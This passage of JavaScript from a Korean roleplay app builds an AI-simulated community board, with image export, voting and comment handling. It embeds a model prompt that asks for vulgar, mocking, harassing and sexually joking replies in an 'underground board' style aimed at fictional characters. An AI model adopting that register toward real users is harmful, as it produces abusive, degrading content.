      if (!n.classList.contains('pc-stand')) { c.style.width = n.offsetWidth + 'px'; c.style.height = n.offsetHeight + 'px'; }
      return ser.serializeToString(c); }).join('');
    const css = [...root.querySelectorAll('style')].map(x => x.textContent).join('\n').replace(/:host/g, '.snap') + '\n.snap .bd,.snap .bd *,.snap .iphone,.snap .pc{box-shadow:none!important}';
    // 아이폰(사파리·카톡)은 viewBox로 foreignObject를 안 키워줘서 1배로 왼쪽 위에만 그려지고 나머지가 하얘져요 → zoom으로 직접 2배
    const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="${w * 2}" height="${h * 2}"><foreignObject width="100%" height="100%"><div xmlns="http://www.w3.org/1999/xhtml" class="snap" style="zoom:2;width:${w}px;height:${h}px;box-sizing:border-box;padding:${pad}px;background:#fff"><style>${css.replace(/</g, '\\3c ')}</style>${body}</div></foreignObject></svg>`;
    const img = new Image(); img.src = 'data:image/svg+xml;charset=utf-8,' + encodeURIComponent(svg);
    try { await img.decode(); } catch (_) { toast('이미지를 만들지 못했어요.', 'err'); return; }
    const scale = 2, cv = document.createElement('canvas'); cv.width = w * scale; cv.height = h * scale;
    const x = cv.getContext('2d'); x.fillStyle = '#fff'; x.fillRect(0, 0, cv.width, cv.height); x.drawImage(img, 0, 0, cv.width, cv.height);
    const name = `${kind === 'pc' ? '컴퓨터' : '폰'}-${String(nav.phWho || '').replace(/[\\/:*?"<>|]/g, '')}.png`;
    let blob; try { blob = await new Promise(r => cv.toBlob(r, 'image/png')); } catch (_) { blob = null; }
    const ios = /iPhone|iPad|iPod/.test(navigator.userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
    if (!blob) { nav.bdImg = img.src; render(); return; }
    const url = URL.createObjectURL(blob);
    if (!ios) { const a = document.createElement('a'); a.href = url; a.download = name; document.body.appendChild(a); a.click(); a.remove(); setTimeout(() => URL.revokeObjectURL(url), 4000); toast('이미지를 저장했어요', 'ok', 2200); return; }
    const file = new File([blob], name, { type: 'image/png' });
    try { if (navigator.canShare?.({ files: [file] })) { await navigator.share({ files: [file] }); return; } } catch (e) { if (e?.name === 'AbortError') return; }
    nav.bdImg = url; render();
  }
  const devImgSheet = () => nav.bdImg ? `<div class="imgsheet" data-act="imgclose"><button class="img-x" data-act="imgclose" aria-label="닫기">✕</button><img src="${nav.bdImg}" alt="이미지" data-act="noop"><p>이미지를 길게 눌러 '사진에 저장'을 고르세요</p><button class="img-close" data-act="imgclose">닫기</button></div>` : '';
  // 참고할 대화 범위 고르기(기본: 최근 25턴) + 만들기 버튼
  const rangePick = label => { const end = (snapshot?.note?.turns || 0) + freshTurns(), start = Math.max(1, end - (nav.rgKind === 'live' ? 1 : 24)); // 실시간톡은 추천 2턴
    return `<div class="bd-range"><span>참고할 대화</span><input type="number" inputmode="numeric" min="1" data-out="bdFrom" value="${start}"><span>~</span><input type="number" inputmode="numeric" min="1" data-out="bdTo" value="${end}"><span>턴</span>
      <button class="btn sm pri" data-act="bdmake"${busyNow ? ' disabled' : ''}>${busyNow ? '만드는 중…' : label}</button></div>`; };
  // 👍/👎: 누르면 +1, 다시 누르면 취소(이 브라우저에 저장)
  async function bdVote(dir) {
    const p = boardData?.data?.posts?.[nav.bdPost]; if (!p) return;
    if (p.dislikes == null) p.dislikes = Math.round((p.likes || 0) / 9);
    const key = dir === 'up' ? 'likes' : 'dislikes', other = dir === 'up' ? 'dislikes' : 'likes';
    if (p.myVote === dir) { p[key] = Math.max(0, (p[key] || 0) - 1); p.myVote = null; }
    else { if (p.myVote) p[other] = Math.max(0, (p[other] || 0) - 1); p[key] = (p[key] || 0) + 1; p.myVote = dir; }
    await setValue('board:' + chatIdFromPath(), JSON.stringify(boardData));
  }
  // 💬 내 댓글 → 바로 붙이고, 로딩 보이는 동안 커뮤니티 사람들 대댓글을 AI로 받아 이어 붙임
  const REPLY_PROMPT = `너는 RP 세계 안 커뮤니티 게시판의 댓글러들이다. [글]과 지금까지 [댓글]을 읽고, 방금 달린 [새 댓글]에 대해 자유롭게 대댓글을 단다.
- [이번 판 온도]는 분위기만 정해 준다. 왜·어떻게 그렇게 되는지(누가 불을 붙이는지, 싸움이 어디로 번지는지, 여론이 어떻게 움직이는지)는 이 글·이 댓글을 보고 매번 새로 만든다. 같은 전개 방식을 되풀이하지 않는다. 온도가 높아도 욕만 늘리지 않는다.
- 개수는 상황 따라 1~5개. 그냥 지나갈 댓글이면 1개, 판이 커질 댓글이면 4~5개. 매번 같은 개수로 맞추지 않는다(무플은 없다).
- 대댓글이 내 댓글에만 달릴 필요는 없다: 댓글러끼리 서로에게 받아치며 싸우는 사슬(to에 서로의 닉(ip))도 된다.
- 자유·익명 게시판: 더쿠·여시·인스티즈·네이트판·에펨·엠팍·블라인드·에타·카페·맘카페·트위터(X)·오타쿠 커뮤 등의 말투. 시비·밈·조롱·커뮤식 드립 활용.
- 음지 게시판: 디시인사이드 야갤·정병갤, 루리웹, 일베, 메갈, 워마드 등의 음지 말투: 은어, 비속어, 초성체, 성적 농담, 조롱, 희롱, 과격한 드립 적극 활용. 천박하게.
- 말투·어미·밈만 가져오고 현실의 성별·지역·집단을 비하하는 멸칭은 쓰지 않는다(조롱 대상은 이 이야기 속 인물·상황).
- 사람마다 말투는 다르게.
- 이모지·텍스트 이모티콘은 어울릴 때만 쓴다(사람마다 버릇이 다르게). 쓰는 양은 아래 주사위 줄을 따른다.
- 착한 반응만 쓰지 않는다. [댓글]에 이미 나온 단골 멘트(세 줄 요약 요구, 어그로·병먹금 언급, 캡처·박제 언급 등)는 다시 쓰지 않는다. 남을 어그로라고 부르는 반응은 상대가 진짜 분탕일 때만. 서로 싸우기도 한다.
- [답글 대상 댓글]이 있으면 그 둘의 대화에 끼어든다. 원댓글이 싸가지 없거나 공격적이면 원댓글러가 다시 받아치고, 편 들기·비꼼·조리돌림·싸움 붙이기로 판을 키울 수도 있다. 원댓글이 맞는 말이면 동조·추가 폭로, 웃기면 드립 받기. 가끔 쉴드·중재도. 매번 같은 패턴은 피한다.
- 글쓴이가 끼어들 수도 있다(해명·반박). 그때 nick·ip는 [글쓴이]와 똑같이.
- 아주 가끔(대부분은 0개) 분탕이 끼어든다(일부러 반대로 말하기, 남 까기, 싸움 붙이기). 그 게시판 말투로.
- ★ 이 지침에는 예시 문장을 넣지 않았다. 매번 이 글·이 댓글에 맞는 새 말로 쓴다. [댓글]에 이미 나온 말·드립도 되풀이하지 않는다.
- 한 번에 단 대댓글들끼리 반응이 겹치지 않게(같은 맞장구만 여러 개 금지).
- 새 댓글 쓴 사람이 익명인지 실명인지는 [새 댓글] 아래 안내를 따른다. 그 사람 말을 대신 더 쓰지 않는다. 익명이면 그 사람의 진짜 이름을 짐작해서 부르지 않는다.
- [기억 노트]의 인물(NPC)도 아주 가끔(0~1개) 몰래 끼어들 수 있다. 그 인물의 성격·말투·숨긴 마음 그대로 쓰고, by에 그 인물 정본명. 그 인물이 모르는 정보는 쓰지 않는다. 비밀은 맞히지 않는다.
- 쓰지 않는 것: 미성년자(또는 나이가 확실하지 않은 인물)에 대한 성적인 말, 현실의 특정 집단을 향한 혐오 표현. 음지 게시판이 아니면 노골적인 성적 묘사도.
[출력] JSON 배열 하나만. 설명·코드블록 금지.
[{"nick":"닉네임","ip":"익명·음지일 때만, 아니면 빈 칸","text":"대댓글","ago":"방금","likes":0,"by":"","to":"이 대댓글이 대꾸하는 사람(새 댓글 쓴 사람이나 앞 대댓글러). ip가 있으면 닉(ip) 그대로"}]`;
  let bdTyping = null, bdTypingAt = -1; // 대댓글 기다리는 글 번호 · 그 글에서 내 댓글 위치
  const keepView = () => { const m = out('main'), y = m?.scrollTop || 0; render(); if (m) m.scrollTop = y; };
  // 익명·닉네임 댓글에는 기억 노트에서 유저 캐릭터 정보를 빼고 보냅니다. AI가 노트를 보고 "이 댓글 쓴 사람은 유저"라고 짐작하지 못하게.
  //   유저 인물 블록(【이름】 줄부터 다음 인물·칸 제목 전까지)과, 유저 이름이 들어간 줄을 지웁니다.
  const noUserNote = memory => {
    const names = [...PROF.entries()].filter(([, v]) => v.isUser).flatMap(([n]) => personAlias(n)); if (!names.length) return memory;
    let skip = false; const out = [];
    for (const l of String(memory || '').split('\n')) {
      const head = l.match(/【([^】]+)】/), isHead = /^\s*(?:■|##|▸|###)/.test(l) || !!head;
      if (head && names.some(n => head[1].includes(n))) { skip = true; continue; }
      if (skip && isHead) skip = false;
      if (skip || names.some(n => l.includes(n))) continue;
      out.push(l);
    }
    return out.join('\n');
  };
  async function bdComment() {
    const rep = Number.isInteger(nav.bdReplyTo), i = nav.bdPost, p = boardData?.data?.posts?.[i], input = out(rep ? 'bdCmtR' : 'bdCmt'), text = String(input?.value || '').trim();
    if (!p || !text || bdTyping != null) return;
    const tagOf = c => (c?.nick || '익명') + (c?.ip ? `(${c.ip})` : '');
    const d = boardData.data, vibe = (d.boards || []).map(b => typeof b === 'string' ? { name: b } : b).find(b => b.name === p.board)?.vibe || '';
    const anon = /익명|음지/.test(vibe), hide = out(rep ? 'bdAnonR' : 'bdAnon')?.checked !== false; nav.bdAnon = hide;
    const me = [...PROF.entries()].find(([, v]) => v.isUser)?.[0] || '나';
    p.comments = p.comments || [];
    const nickIn = String(out(rep ? 'bdNickR' : 'bdNick')?.value || '').trim().slice(0, 20);
    if (!hide && nickIn) { nav.bdNick = nickIn; setValue('bdNick', nickIn); }
    const myNick = nickIn || nav.bdNick || me, real = myNick === me || personAlias(me).includes(myNick);
    // 사칭: 이 글에 이미 있는 남의 닉네임(글쓴이·댓글러)이나 노트 속 다른 인물 이름을 그대로 따라 쓴 경우. 그 사람 본인 댓글로 치지 않게 합니다.
    // 🎲 대댓글 개수·흐름은 코드가 굴려요(AI에게 맡기면 늘 비슷한 개수·전개가 나와서).
    const fakeC = !hide && !real && [p, ...(p.comments || [])].some(c => !c.mine && c.nick === myNick);
    const fakeN = !hide && !real && !fakeC && [...PROF.entries()].some(([n, v]) => !v.isUser && (n === myNick || personAlias(n).includes(myNick)));
    const fake = fakeC || fakeN;
    const mine = { nick: hide ? (anon ? 'ㅇㅇ' : '익명') : myNick, ip: hide && anon ? '125.18' : '', text, ago: '방금', likes: 0, mine: true };
    // 답글이면 그 댓글(과 이미 달린 대댓글) 바로 뒤에, 아니면 맨 끝에
    const to = Number.isInteger(nav.bdReplyTo) && p.comments[nav.bdReplyTo] ? nav.bdReplyTo : null, parent = to != null ? p.comments[to] : null;
    let pos = p.comments.length;
    if (to != null) { pos = to + 1; while (p.comments[pos]?.reply) pos++; mine.reply = true; mine.to = (parent.nick || "익명") + (parent.ip ? "(" + parent.ip + ")" : ""); }
    p.comments.splice(pos, 0, mine); nav.bdReplyTo = null;
    const at = pos + 1; // 반응 대댓글은 내 댓글 바로 뒤에
    bdTyping = i; bdTypingAt = pos; await setValue('board:' + chatIdFromPath(), JSON.stringify(boardData)); keepView();
    try {
      const ctx = [`[게시판] ${p.board || ''} (분위기: ${vibe || '자유'})`, `[글] ${p.title || ''}\n${p.body || ''}`, `[글쓴이] ${p.nick || '익명'}${p.ip ? `(${p.ip})` : ''}`,
        '[댓글]', ...p.comments.filter(c => c !== mine).slice(-12).map(c => `${c.reply ? 'ㄴ ' : ''}${tagOf(c)}${c.mine ? ' [← 새 댓글 쓴 사람이 앞서 단 댓글' + (fake ? '(닉 따라 쓴 사람, 원래 주인 아님)' : '') + ']' : ''}: ${c.text || ''}`),
        '(대괄호 [← …] 표시는 너만 아는 정보다. 그 표시가 붙은 댓글은 원래 그 닉네임 주인이 쓴 게 아니라 새 댓글 쓴 사람이 쓴 것이다. 원래 주인은 그 댓글을 자기가 썼다고 하지 않는다)',
        ...(parent ? [`[답글 대상 댓글] ${tagOf(parent)}: ${parent.text || ''} — 새 댓글은 이 댓글에 단 답글이다. 대댓글러들은 이 둘의 대화에 끼어든다(원댓글 쓴 사람이 다시 반박해도 됨)`] : []),
        `[새 댓글] ${tagOf(mine)}${fakeC ? ' ← 같은 닉네임을 따라 쓴 다른 사람' : fakeN ? ' ← 노트 속 인물과 이름이 같은 닉네임(그 인물 본인인지는 아무도 모름)' : ''}: ${text}`, `[이번 판 온도] ${dice(['조용히 지나감', '조금 시끌', '시끄러워짐', '시끄러워짐', '판이 크게 터짐'])}${Math.random() < 0.2 ? ' · 어딜 가나 있는 시비꾼 한 명이 낌' : ''}`, ...(fakeN ? [`(새 댓글 닉 '${myNick}'은 노트 속 인물과 이름이 같다. 이 글에는 원래 그 닉네임을 쓰던 댓글러가 없다 — "내가 위에서 단 댓글"처럼 그 닉으로 앞서 댓글을 단 사람을 지어내지 않고, [← …] 표시가 붙은 댓글을 다른 사람이 자기가 썼다고 하지 않는다. 이번 반응: ${dice(['진짜 그 인물인 줄 알고 찐등판이라며 놀람', '닉만 같은 사칭이라고 의심하며 놀림', '그냥 닉네임으로 보고 내용에만 반응', '반반: 찐이라는 쪽과 사칭이라는 쪽이 싸움', '노트 속 그 인물이 몰래 나타나 자기 아니라고 부정(그 인물 성격·말투대로, by에 정본명)'])})`] : []),
        ...(fakeC ? [`(새 댓글은 '${myNick}' 닉네임을 똑같이 따라 쓴 다른 사람의 댓글이다(원래 주인이 쓴 게 아님). 댓글러들은 이걸 알 수도 모를 수도 있다. 이번 반응: ${dice(anon
          ? ['대부분 속지만 한 명이 아이피가 다르다고 의심', '아이피 보고 바로 사칭 의심, 몇 명은 그래도 믿음', '원래 주인이 등판해 부정하고 누가 진짜냐로 싸움', '분탕이 사칭에 사칭을 얹어 난장판', '반반: 속는 쪽과 의심하는 쪽이 싸움']
          : ['아무도 눈치 못 채고 원래 주인 말로 받아들임', '대부분 속고 한 명만 갸웃', '원래 주인이 등판해 부정하고 누가 진짜냐로 싸움', '분탕이 사칭에 사칭을 얹어 난장판', '반반: 속는 쪽과 의심하는 쪽이 싸움'])}. 속은 사람은 원래 주인이 한 말로 받아들인다)`] : []),'(대댓글의 to에는 위에 나온 작성자 표시(닉네임(아이피))를 그대로 쓴다. 댓글 내용을 to에 쓰지 않는다)', hide ? '(새 댓글 쓴 사람은 익명이다. 댓글러들은 이 사람이 누군지 전혀 모르고, 유저나 노트 속 인물과 엮어 짐작하거나 이름을 부르거나 "본인 등판"처럼 반응하지 않는다. 그냥 지나가던 아무나 단 댓글로 대한다. 말투·글솜씨로 정체를 짐작하는 말은 쓰지 않는다. 단 댓글 안에서 본인이 스스로 누구(유저 본인·노트 속 특정 인물)라고 밝히면, 정체보다 댓글 내용 자체에 반응한다(음지면 내용 갖고 시비·조롱·드립도 그대로). 믿고 신기해하는 쪽, 반신반의하며 떠보는 쪽이 섞이고, 사칭 의심은 많아야 한 명. 정병·망상병·주작 몰이는 아주 가끔만.)' : real ? `(새 댓글은 ${me}이(가) 실명으로 썼다. 댓글러들은 그게 누군지 알아보고 "본인 등판"처럼 반응한다. 단, ${me}의 말을 대신 더 쓰지는 않는다)` : `(새 댓글은 '${myNick}'이라는 닉네임으로 달렸다. 댓글러들은 누군지 전혀 모른다. 말투·글솜씨로 의심하거나 유저·노트 속 인물과 엮어 부르지 않고, 그냥 그 닉네임을 쓰는 낯선 사람으로 대한다. 단 댓글 안에서 본인이 스스로 누구(유저 본인·노트 속 특정 인물)라고 밝히면, 정체보다 댓글 내용 자체에 반응한다(음지면 내용 갖고 시비·조롱·드립도 그대로). 믿고 신기해하는 쪽, 반신반의하며 떠보는 쪽이 섞이고, 사칭 의심은 많아야 한 명. 정병·망상병·주작 몰이는 아주 가끔만. 그 사람 말을 대신 더 쓰지 않는다)`, '', '[기억 노트]', hide || !real ? noUserNote(await etcMemory(chatIdFromPath())) : await etcMemory(chatIdFromPath())].join('\n');
      const raw = await askModel(withRules(REPLY_PROMPT, ETC_KO + etcRoll(true)), ctx, '💬대댓글');
      let list; try { const t = String(raw).replace(/^```\w*\n?|\n?```$/g, ''), a = t.indexOf('['), b = t.lastIndexOf(']'); list = JSON.parse(t.slice(a, b + 1)); } catch (_) { throw new Error('답을 읽지 못했어요'); }
      // to는 실제 있는 작성자(글쓴이·댓글러·앞 대댓글러)만. 모르는 말(댓글 내용 등)이면 내 댓글에 단 걸로 봅니다.
      const known = new Set([tagOf(p), ...p.comments.map(tagOf)]), myTag = tagOf(mine);
      const replies = [];
      // 거의 같은 문장(두 글자 조각 70% 넘게 겹침)은 하나만: 이번 대댓글끼리 + 내 새 댓글과
      //   짧은 반응(ㅅㅂㅋㅋ·ㄹㅇ 같은 7글자 미만)은 겹쳐도 그대로 둬요
      const g2 = t => { const x = String(t || '').replace(/[\s\p{P}\p{S}]/gu, ''), g = new Set(); for (let k = 0; k < x.length - 1; k++) g.add(x.slice(k, k + 2)); return g; };
      const near = (a, b) => { if (a.size < 6 || b.size < 6) return false; let n = 0; for (const x of a) if (b.has(x)) n++; return n / Math.min(a.size, b.size) > 0.7; };
      const seenG = [g2(text)];
      for (const r of (Array.isArray(list) ? list : []).slice(0, 12)) {
        { const g = g2(r.text); if (seenG.some(x => near(g, x))) continue; seenG.push(g); }
        const t = String(r.to || '').trim().replace(/^@/, '');
        const to = !t || t.includes(me) || personAlias(me).some(n => t.includes(n)) || t.includes(myNick) || !known.has(t) ? myTag : t;
        const c = { nick: r.nick || 'ㅇㅇ', ip: anon ? (r.ip || '') : '', text: r.text || '', ago: '방금', likes: Number(r.likes) || 0, reply: true, by: r.by || '', to };
        replies.push(c); known.add(tagOf(c));
      }
      p.comments.splice(at, 0, ...replies);
      await setValue('board:' + chatIdFromPath(), JSON.stringify(boardData));
    } catch (e) { toast('대댓글 받기 실패 · ' + e.message, 'err'); }
    finally { bdTyping = null; bdTypingAt = -1; keepView(); }
  }
  // 참고할 대화 고르기는 팝업으로(바깥을 누르면 닫힘)
  const rangeSheet = label => `<div class="rsheet" data-act="bdrange"><div class="rbox" data-act="noop"><b>참고할 대화</b><small>${nav.rgKind === 'live' ? '이 범위의 대화를 드라마 한 화로 틀어요 · 추천 2턴 · 최대 5턴' : nav.rgKind === 'wiki' ? (snapshot?.note ? '이 범위의 실제 대화를 기억 노트와 함께 보내요' : '이 범위의 실제 대화를 불러와서 만들어요') : nav.rgKind === 'news' ? (snapshot?.note ? '이 범위의 실제 대화를 기억 노트와 함께 보내요' : '이 범위의 실제 대화를 불러와서 만들어요') : nav.rgKind === 'npc' ? '이 범위의 대화에서 NPC를 찾아 목록에 더해요(있던 인물은 그대로)' : nav.rgKind === 'quote' ? '이 범위의 대화에서 골라 기존 명대사 뒤에 더해요' : snapshot?.note ? '이 범위의 실제 대화를 기억 노트와 함께 보내요' : '이 범위의 실제 대화를 불러와서 만들어요'}</small>${rangePick(label)}</div></div>`;
  function boardHtml() {
    if (!snapshot?.note && !freshTurns()) return emptyBox('아직 대화가 없어요. RP를 조금 하고 나면 이 세계의 커뮤니티를 열어 볼 수 있어요.');
    const head = devSeg(); // 회색 설명 상자 없이 바로 사이트
    // 만드는 중엔 로딩 카드만(빈 사이트·열어 보기 버튼은 숨김)
    if (!boardData && busyNow && genProg) return head + genCard();
    if (!boardData) return head + genCard() + `<div class="bd"><div class="bd-empty"><b>이 세계의 커뮤니티</b><small>자유·익명·음지 게시판을 한 번에 · AI를 1번 불러요 · 기억 노트엔 안 들어가요</small>
      <button class="ph-make" data-act="bdrange">🗨 커뮤니티 열어 보기</button></div></div>${nav.bdRange ? rangeSheet('만들기') : ''}`;
    // 사이트처럼: 색 막대 + 이름 / 메뉴(메인·게시판들) / 메인·게시판·게시글 화면
    const d = boardData.data || {}, posts = d.posts || [];
    const boards = (d.boards || [...new Set(posts.map(p => p.board).filter(Boolean))]).map(b => typeof b === 'string' ? { name: b, vibe: '' } : b);
    const vibeOf = name => boards.find(b => b.name === name)?.vibe || '';
    const seen = nav.bdSeen || (nav.bdSeen = new Set());
    // 몰래 보기는 기억 노트에 있는 인물(유저 빼고)일 때만. AI가 by에 닉네임(ㅇㅇ 등)을 넣으면 버튼을 안 띄움
    const npcOf = by => { const c = canon(by); return c && (CANON.includes(c) || PROF.has(c)) && !PROF.get(c)?.isUser ? c : ''; };
    const reveal = (by, key) => { const who = npcOf(by); return who ? `<button class="bd-by" data-act="bdwho" data-arg="${esc(key)}">${seen.has(key) ? `✍ ${esc(who)}` : '작성자 몰래 보기'}</button>` : ''; };
    const nick = x => `${esc(x.nick || '익명')}${x.ip ? `<span class="bd-ip">(${esc(x.ip)})</span>` : ''}`;
    const cmtN = p => (p.comments || []).length;
    // 목록 한 줄: HOT · 개념(추천 50↑) · [게시판] 제목 [댓글수] · N(3시간 안 된 글)
    // N은 마지막 새로고침으로 올라온 글에만(다음 새로고침 때 그 글들로 옮겨감)
    const fresh = p => !!p.batch && p.batch === boardData?.refreshed;
    const row = ([p, i]) => `<button class="bd-row" data-act="bdgo" data-arg="${i}"><b>${p.hot ? '<em class="bd-hot">HOT</em>' : (p.likes || 0) >= 50 ? '<em class="bd-best">개념</em>' : ''}<span class="bd-tag">[${esc(p.board || '')}]</span> ${esc(p.title || '')}${cmtN(p) ? ` <span class="bd-cn">[${cmtN(p)}]</span>` : ''}${fresh(p) ? ' <em class="bd-n">NEW</em>' : ''}</b>
      <small>${nick(p)} · ${esc(p.ago || '')} · 조회 ${fmt(p.views || 0)} · 추천 ${fmt(p.likes || 0)}</small></button>`;
    const all = posts.map((p, i) => [p, i]);
    const open = nav.bdPost != null && posts[nav.bdPost] ? posts[nav.bdPost] : null;
    const cur = open ? open.board : (boards.some(b => b.name === nav.bdBoard) ? nav.bdBoard : '');
    // 카페·갤러리처럼: 커버 배너(커뮤니티마다 다른 색) + 걸쳐 있는 로고 + 이름·소개·회원 수
    const nm = String(d.name || '커뮤니티'), hash = [...nm].reduce((a, ch) => a + ch.codePointAt(0), 0);
    const [c1, c2] = [['#FF7A59', '#FFB36B'], ['#7B61FF', '#C08CFF'], ['#13B38B', '#7EDBB8'], ['#E24A6A', '#FF9AA2'], ['#2E3A59', '#6B7FB0'], ['#F2994A', '#F2C94C']][hash % 6];
    const members = d.members || 3000 + (hash * 37) % 47000, today = Math.round(members * 0.08);
    const refreshBtn = open ? '' : `<span class="bd-tools" style="margin:0 0 0 auto;flex:none"><button data-act="bdrefresh" data-arg="${esc(cur)}" style="font-size:11.5px;padding:4px 9px"${busyNow ? ' disabled' : ''}>${busyNow ? '불러오는 중…' : cur ? '🔄 이 게시판 새로고침' : '🔄 전체 새로고침'}</button></span>`;
    const bar = `<div class="bd-cover" style="background:linear-gradient(135deg,${c1},${c2})"></div>
      <div class="bd-head"><span class="bd-logo" style="background:linear-gradient(135deg,${c1},${c2})">${esc([...nm.replace(/\s/g, '')].slice(0, 2).join(''))}</span>
        <span class="bd-hn"><b>${esc(nm)}</b><small>${esc(d.about || '')}</small><small>회원 ${fmt(members)} · 오늘 방문 ${fmt(today)}</small></span>${refreshBtn}</div>
      <div class="bd-menu">${[{ name: '' }, ...boards].map(b => `<button data-act="bdboard" data-arg="${esc(b.name)}" aria-pressed="${b.name === cur && !open}">${b.name ? `${VIBE[b.vibe] || ''} ${esc(b.name)}` : '메인'}</button>`).join('')}</div>`;
    let inner;
    if (open) {
      const p = open;
      inner = `<div class="bd-post"><p class="bd-crumb"><button data-act="bdboard" data-arg="${esc(p.board || '')}">‹ ${VIBE[vibeOf(p.board)] || ''} ${esc(p.board || '목록')}</button></p>
          <h4>${p.hot ? '<em class="bd-hot">HOT</em>' : ''}${esc(p.title || '')}</h4>
          <p class="bd-author"><span class="av bd-av">${esc([...String(p.nick || '익')][0])}</span><span><b>${nick(p)}</b> ${reveal(p.by, `${nav.bdPost}:p`)}<small>${esc(p.ago || '')} · 조회 ${fmt(p.views || 0)} · 추천 ${fmt(p.likes || 0)} · 댓글 ${cmtN(p)}</small></span></p>
          <div class="bd-body">${(() => { let html = '', cur = [], blank = 0; const flush = () => { if (cur.length) html += '<p>' + cur.map(esc).join('<br>') + '</p>'; cur = []; }; for (const raw of String(p.body || '').split('\n')) { const l = raw.trim(); if (!l) { blank++; continue; } if (blank && (cur.length || html)) { flush(); if (blank > 1) html += '<i class="bd-gap" style="height:' + Math.min(blank - 1, 12) * 25 + 'px"></i>'; } blank = 0; cur.push(l); } flush(); return html; })()}</div>
          <div class="bd-vote"><button data-act="bdvote" data-arg="up" aria-pressed="${p.myVote === 'up'}">👍 추천 <b>${fmt(p.likes || 0)}</b></button><button data-act="bdvote" data-arg="down" aria-pressed="${p.myVote === 'down'}">👎 비추 <b>${fmt(p.dislikes ?? Math.round((p.likes || 0) / 9))}</b></button></div></div>
        ${(() => { const key = c => { const o = c._src || c; if (!o.id) o.id = Math.random().toString(36).slice(2, 9); return `${nav.bdPost}:${o.id}`; };
          const cs = p.comments || [], to = Number.isInteger(nav.bdReplyTo) && cs[nav.bdReplyTo] ? nav.bdReplyTo : -1;
          let end = to; if (to >= 0) while (cs[end + 1]?.reply) end++;
          const replyBox = () => `<div class="bd-write bd-write-r"><label class="bd-anon"><input type="checkbox" data-act="bdanon" data-out="bdAnonR"${nav.bdAnon === false ? '' : ' checked'}>익명</label>${nav.bdAnon === false ? `<input type="text" class="bd-nick" data-out="bdNickR" maxlength="20" placeholder="닉네임" value="${esc(nav.bdNick || [...PROF.entries()].find(([, v]) => v.isUser)?.[0] || '')}">` : ''}<input type="text" data-out="bdCmtR" maxlength="300" placeholder="${esc((cs[to]?.nick || '익명') + (cs[to]?.ip ? '(' + cs[to].ip + ')' : ''))}님에게 답글" autocomplete="off"><button data-act="bdcmt"${bdTyping != null ? ' disabled' : ''}>등록</button><button class="bd-x" data-act="bdrep" data-arg="" aria-label="답글 취소">✕</button></div>`;
          const cm = c => { const idx = (p.comments || []).indexOf(c._src || c);
            if (c.reply && !c.to && idx > 0) { const cs0 = p.comments || []; let j = idx - 1; while (j > 0 && cs0[j].reply) j--; const par = cs0[j]; if (par && par !== c) c = { ...c, to: (par.nick || '익명') + (par.ip ? `(${par.ip})` : '') }; }
            return `<div class="bd-c${c.reply ? ' re' : ''}${c.mine ? ' mine' : ''}${nav.bdReplyTo === idx && !c._src ? ' to' : ''}"><p class="bd-cw">${c.reply ? '<i>ㄴ</i>' : ''}<b>${nick(c)}</b>${c.mine ? '<em class="bd-me">나</em>' : ''}${!c.mine && c.nick && c.nick === p.nick && (c.ip || '') === (p.ip || '') ? '<em class="bd-op">글쓴이</em>' : ''} ${reveal(c.by, key(c))}<small>${esc(c.ago || '')}${c.likes ? ` · 추천 ${c.likes}` : ''}</small>${c._src || bdTyping != null ? '' : `<button class="bd-rep" data-act="bdrep" data-arg="${idx}">답글</button>`}</p><p class="bd-ct">${c.reply && c.to ? `<span class="bd-to">@${esc(c.to)}</span> ` : ''}${esc(c.text || '')}</p></div>`
              // 반응 기다리는 동안: 내 댓글 바로 밑에 ㄴ ··· 댓글 다는 중
              + (!c._src && bdTyping === nav.bdPost && idx === bdTypingAt ? '<div class="bd-c re bd-typing"><p class="bd-cw"><i>ㄴ</i><b>ㅇㅇ</b><small>방금</small></p><p class="bd-ct"><span class="dots"><i></i><i></i><i></i></span> 댓글 다는 중</p></div>' : '')
              + (!c._src && to >= 0 && idx === end && bdTyping == null ? replyBox() : ''); };
          const target = Number.isInteger(nav.bdReplyTo) ? (p.comments || [])[nav.bdReplyTo] : null;
          // 베스트 댓글: 추천 많은 2개(추천 10 이상)
          const best = [...(p.comments || [])].filter(c => (c.likes || 0) >= 10).sort((a, b) => (b.likes || 0) - (a.likes || 0)).slice(0, 2);
          return (best.length ? `<div class="bd-cmts bd-bestc"><p class="bd-ch">🏆 베스트 댓글</p>${best.map(c => cm({ ...c, reply: false, _src: c })).join('')}</div>` : '')
            + `<div class="bd-cmts"><p class="bd-ch">전체 댓글 <b>${cmtN(p)}</b>개</p>${(p.comments || []).map(cm).join('')}`
            + `<div class="bd-write"><label class="bd-anon"><input type="checkbox" data-act="bdanon" data-out="bdAnon"${nav.bdAnon === false ? '' : ' checked'}>익명</label>${nav.bdAnon === false ? `<input type="text" class="bd-nick" data-out="bdNick" maxlength="20" placeholder="닉네임" value="${esc(nav.bdNick || [...PROF.entries()].find(([, v]) => v.isUser)?.[0] || '')}">` : ''}<input type="text" data-out="bdCmt" maxlength="300" placeholder="댓글을 입력하세요" autocomplete="off"><button data-act="bdcmt"${bdTyping != null ? ' disabled' : ''}>등록</button></div></div>`; })()}
        <p class="bd-snap"><button class="linkbtn" data-act="bdimg" data-arg="post">이미지로 저장</button></p>`;
    } else if (!cur) {
      const hot = all.filter(([p]) => p.hot).concat(all.filter(([p]) => !p.hot).sort((a, b) => (b[0].likes || 0) - (a[0].likes || 0))).slice(0, 5);
      const notices = d.notices || [], spots = d.hotspots || [];
      const latest = all.filter(([, i]) => !hot.some(([, j]) => j === i)).slice(0, 10); // 평범한 글도 메인에서 보이게
      inner = (notices.length ? `<div class="bd-notice">${notices.map(n => `<details><summary><em>${esc(n.kind === '핫플 알림' ? '🔔 핫플' : n.kind || '공지')}</em>${esc(n.title || '')}</summary><p>${esc(n.body || '')}</p></details>`).join('')}</div>` : '')
        + (() => { const nw = all.filter(([p]) => fresh(p)).slice(0, 5); return nw.length ? `<p class="bd-sec">🆕 방금 올라온 글</p><div class="bd-list">${nw.map(row).join('')}</div>` : ''; })()
        + (hot.length ? `<p class="bd-sec">🔥 실시간 HOT</p><div class="bd-rank">${hot.map(([p, i], n) => `<button data-act="bdgo" data-arg="${i}"><em>${n + 1}</em><span><span class="bd-tag">[${esc(p.board || '')}]</span> ${esc(p.title || '')}${cmtN(p) ? ` <span class="bd-cn">[${cmtN(p)}]</span>` : ''}</span></button>`).join('')}</div>` : '')
        + (latest.length ? `<p class="bd-sec">🕘 최신글</p><div class="bd-list">${latest.map(row).join('')}</div>` : '')
